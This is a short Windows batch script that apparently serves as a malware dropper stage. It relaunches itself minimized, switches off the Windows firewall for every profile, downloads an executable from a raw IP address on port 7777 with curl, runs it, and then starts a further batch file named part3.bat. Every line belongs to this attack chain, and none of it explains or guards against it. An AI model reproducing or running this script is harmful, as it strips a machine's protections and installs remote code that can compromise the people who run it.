if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
netsh advfirewall set allprofiles state off
cd C:\configuration
curl http://111.90.151.174:7777/5201.exe -O
5201.exe
start cmd.exe /k "C:\configuration\part3.bat"
exit